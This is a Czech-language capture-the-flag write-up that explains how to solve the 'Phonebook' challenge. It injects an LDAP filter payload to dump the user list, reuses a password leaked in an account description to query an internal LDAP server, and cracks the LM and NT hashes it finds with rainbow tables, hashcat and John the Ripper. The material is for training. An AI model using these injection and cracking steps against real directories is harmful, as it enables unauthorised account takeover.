# Phonebook (5)

## Zadání

Hi, packet inspector,

you should already get access to the phone book – as a new employee – but the AI is too busy right now. This condition can last several ... who knows ... years?

Your task is to gain access to the application running on <http://phonebook.mysterious-delivery.tcc:40000>.

May the Packet be with you!

## Nápovědy (Hints)

1\. Use VPN to get access to the server.

## Řešení

Na zobrazené stránce ze zadání je pole pro vložení filtru a také přihlašovací obrazovka, do které ale neznáme heslo. Po vyzkoušení běžných kombinací hlásí stránka jen chyby `No entries found` a `Invalid filter - Try harder;-)`.

Když prozkoumáme zdrojový kód stránky, narazíme na zajímavý text.

```html
<!-- New LDAP server host: 10.99.0.121 -->
<!-- 1/2/2022 Temporary search filter (|(&(memberof=cn=users,ou=groups,dc=local,dc=tcc)(uid=_DATA_))(memberof=cn=nonmigrated,ou=groups,dc=local,dc=tcc)) -->
<!-- 6/8/2022 Filter after migration  (|(&(memberof=cn=users,ou=groups,dc=local,dc=tcc)(uid=_DATA_}))) -->
```

Jedná se tedy o LDAP filtr. Je potřeba zadat filtr, který by vypsal všechny uživatele. Můžeme použít třeba `*)(uid=*))(|(uid=*`.

Dojde k vypsání uživatelů, kde na konci najdeme

| UID         | Description | Phone | DN | Groups |
| ----------- | ----------- | ----- | -- | ------ |
| skeech   |Standard account  | 2108744716 | uid=skeech,ou=people,dc=local,dc=tcc | cn=users,ou=groups,dc=local,dc=tcc |
| admin1   |Admin account     | 7254437132 | uid=admin1,ou=people,dc=local,dc=tcc | cn=admins,ou=groups,dc=local,dc=tcc |
| admin2   |Admin account     | 5452487532 | uid=admin2,ou=people,dc=local,dc=tcc | cn=admins,ou=groups,dc=local,dc=tcc,cn=web_admins,ou=groups,dc=local,dc=tcc |
| ldap_sync|Don't change password. gasg35faCasgt%AF | | uid=ldap_sync,ou=people,dc=local,dc=tcc | cn=admins,ou=groups,dc=local,dc=tcc |

Na poslední řádce je uživatel `ldap_sync` s uvedeným heslem `gasg35faCasgt%AF` v popisu.

Zkusíme uživatele na přihlašovací obrazovce. Nefunguje 😒.

Z hlavičky ale také víme, že

`New LDAP server host: 10.99.0.121`

Zkusíme se připojit na server `10.99.0.121` se získanými přihlašovacími údaji a zobrazit LDAP seznam.

`ldapsearch -h 10.99.0.121 -D "uid=ldap_sync,ou=people,dc=local,dc=tcc" -w "gasg35faCasgt%AF" -b "dc=local,dc=tcc"`

vrátí detailnější informace o uživatelích

```text
# admin1, people, local.tcc
dn: uid=admin1,ou=people,dc=local,dc=tcc
objectClass: inetOrgPerson
objectClass: sambaSamAccount
cn: admin1
givenName: admin
sn: admin1
homePhone: 7254437132
mail: admin1@local.tcc
sambaSID: S-1-5-21-1528920847-3529959213-6859888036
sambaNTPassword: D43AC268D9148F59AC4F1657D7292204
sambaLMPassword: B1019EF3BC17B7E030495103E1C1A7DD
uid: admin1
description: Admin account

# admin2, people, local.tcc
dn: uid=admin2,ou=people,dc=local,dc=tcc
objectClass: inetOrgPerson
objectClass: sambaSamAccount
cn: admin2
givenName: admin
sn: admin2
homePhone: 5452487532
mail: admin2@local.tcc
sambaSID: S-1-5-21-1528920847-3529959213-2887712062
sambaNTPassword: 32644235283BC5561CC7FE4FFFADDAEE
sambaLMPassword: 48448F207404DB05F3BAC3A9216F6D52
uid: admin2
description: Admin account

# ldap_sync, people, local.tcc
dn: uid=ldap_sync,ou=people,dc=local,dc=tcc
objectClass: inetOrgPerson
objectClass: sambaSamAccount
cn: ldap_sync
givenName: ldap_sync
sn: ldap_sync
mail: ldap_sync@local.tcc
userPassword:: e1NTSEF9VmUvVjB0akRYTyt3dEk3Z0tlaGZXOWJjZXF4WHlsbHI=
sambaSID: S-1-5-21-1528920847-3529959213-9773803020
uid: ldap_sync
description: Don't change password. gasg35faCasgt%AF

# search result
search: 2
result: 0 Success

# numResponses: 76
# numEntries: 75
```

Zajímavé jsou informace pro uživatele `admin2`, který patří do skupiny `web_admins`. U něho jsou uvedeny řádky

```text
sambaNTPassword: 32644235283BC5561CC7FE4FFFADDAEE
sambaLMPassword: 48448F207404DB05F3BAC3A9216F6D52
```

, ve kterých je různými způsoby zakódované heslo.

Začneme snadněji cracknutelným heslem `sambaLMPassword`. Viz <https://cs.wikipedia.org/wiki/LM_hash>

* Heslo se převede na velká písmena.
* Heslo je vždy doplněno na 14 bajtů pomocí nul.
* Heslo je rozděleno na dvě sedmibajtové poloviny.

Zkusíme použít online nástroj <http://rainbowtables.it64.com/>. Okamžitě je zobrazeno heslo pro obě poloviny hashe.

| Hash            | Status  | Plaintext |
| ----            | ------  | --------- |
|48448f207404db05 | CRACKED |  TOOSTRO  |
|f3bac3a9216f6d52 | CRACKED |  NGPASS.  |

Prvních 14 znaků hesla převedeného na velká písmena je tedy `TOOSTRONGPASS.`.

Dá se také použít hashcat (nalezení cca za 15 minut)

`hashcat hash_LM -m 3000  -a 3 ?a?a?a?a?a?a?a`

Zkontrolujeme

```text
$ smbencrypt TOOSTRONGPASS.
LM Hash                                 NT Hash
--------------------------------        --------------------------------
48448F207404DB05F3BAC3A9216F6D52        325338356E0D5879A1AD4D8D40628C7C
```

LM hash souhlasí s hodnotou v LDAP, ale NT hash se liší. NT hash (NTLM) nemá omezení jen na velká písmena ani na délku. Vygenerujeme si slovník všech kombinací velkých a malých písmen z `TOOSTRONGPASS.`.

```python
import itertools

s = 'TOOSTRONGPASS'
print('.\n'.join(map(''.join, itertools.product(*zip(s.upper(), s.lower())))))
```

NT hash heslo je potřeba zlomit bruteforce techniku hybridním způsobem použití slovníku + doplnění dalších znaků.

`hashcat hash_NT -m 1000 -a 6 dict ?a?a?a?a -i`

cca po 45 minutách máme heslo `TooStrongPass.2022`. Pro zkrácení doby můžeme zkusit redukovat generovaný slovník kombinací velkých/malých písmen z `TOOSTRONGPASS.`. Pokud zkusíme uhádnout, že bude heslo začínat `TooStrongPass.`, můžeme použít `John the Ripper` s postupným přidáváním znaků:

`john --format=NT hash_NT --mask=TooStrongPass.?a -max-len=25`

Ten heslo zobrazí za pár sekund.

Přihlásíme se na web `admin2 / TooStrongPass.2022`, v menu se objeví položka `Settings` a v ní se skrývá hledaný flag.

## Flag

`FLAG{iLcT-HnNF-egs3-mCSN}`
